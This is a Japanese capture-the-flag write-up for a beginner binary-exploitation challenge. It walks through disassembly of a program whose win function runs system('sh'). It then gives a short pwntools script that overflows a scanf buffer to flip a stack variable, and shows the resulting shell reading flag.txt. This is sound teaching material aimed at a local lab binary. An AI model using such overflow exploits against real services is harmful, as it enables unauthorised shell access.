# zero 

## access

```
nc localhost 4100
```
main関数が定義されているので読む

```Assembly:main

[0x004010d0]> pdf @main
            ; DATA XREF from entry0 @ 0x4010f1

┌ 107: int main (int argc, char **argv, char **envp);
│           ; var char *var_30h @ rbp-0x30
│           ; var uint32_t var_4h @ rbp-0x4
│           0x004011cd      f30f1efa       endbr64
│           0x004011d1      55             push rbp
│           0x004011d2      4889e5         mov rbp, rsp
│           0x004011d5      4883ec30       sub rsp, 0x30
│           0x004011d9      c745fc000000.  mov dword [var_4h], 0
│           0x004011e0      488d3d200e00.  lea rdi, str.What_s_your_name ; 0x402007 ; "What's your name?\n>" ; const char *format
│           0x004011e7      b800000000     mov eax, 0
│           0x004011ec      e89ffeffff     call sym.imp.printf         ; int printf(const char *format)
│           0x004011f1      488d45d0       lea rax, [var_30h]
│           0x004011f5      4889c6         mov rsi, rax
│           0x004011f8      488d3d1c0e00.  lea rdi, [0x0040201b]       ; "%s" ; const char *format
│           0x004011ff      b800000000     mov eax, 0
│           0x00401204      e8b7feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x00401209      837dfc00       cmp dword [var_4h], 0
│       ┌─< 0x0040120d      740a           je 0x401219
│       │   0x0040120f      b800000000     mov eax, 0
│       │   0x00401214      e89dffffff     call sym.win
│       │   ; CODE XREF from main @ 0x40120d
│       └─> 0x00401219      488d45d0       lea rax, [var_30h]
│           0x0040121d      4889c6         mov rsi, rax
│           0x00401220      488d3df70d00.  lea rdi, str.hello__s       ; 0x40201e ; "hello %s!\n" ; const char *format
│           0x00401227      b800000000     mov eax, 0
│           0x0040122c      e85ffeffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00401231      b800000000     mov eax, 0
│           0x00401236      c9             leave
└           0x00401237      c3             ret
```

rbp-0x30までスタック領域が確保されている  
変数が2つ、[var_4h]と[var_30h]がある  

What's your name?を出力してる  
scanf関数で入力を[var_30h]に読み込んでる  
win関数が呼び出されてる  
くらいのことがわかる

win関数を読む
```Assembly:win

[0x004010d0]> pdf @sym.win
            ; CALL XREF from main @ 0x401214
┌ 23: sym.win ();
│           0x004011b6      f30f1efa       endbr64
│           0x004011ba      55             push rbp
│           0x004011bb      4889e5         mov rbp, rsp
│           0x004011be      488d3d3f0e00.  lea rdi, [0x00402004]       ; "sh" ; const char *string
│           0x004011c5      e8b6feffff     call sym.imp.system         ; int system(const char *string)
│           0x004011ca      90             nop
│           0x004011cb      5d             pop rbp
└           0x004011cc      c3             ret
```

``system("sh")``するだけ  
この関数を呼び出せばshellを起動できる

win関数を起動するにはmainの[var_4h]を0以外にする必要がある  
けどプログラム内で書き換えてそうなところがない...?

main関数の変数は、
```
; var char *var_30h @ rbp-0x30
; var uint32_t var_4h @ rbp-0x4
```
[var_4h]はrbp-0x4、[var_30h]はrbp-0x30のようにスタックが確保されているので、  
[var_30h]に0x2dバイト入力すればスタックオーバーフローするかもしれない  

```python:solve.py
from pwn import *

io = remote('localhost', 4100)
io.sendline('a'*0x2d)
io.interactive()
```

```
$ python solve.py
[+] Opening connection to localhost on port 4100: Done
[*] Switching to interactive mode
What's your name?
>$ whoami
pwn
$ ls
chall
flag.txt
redir.sh
$ cat flag.txt
flag{This_is_review}
```

できた!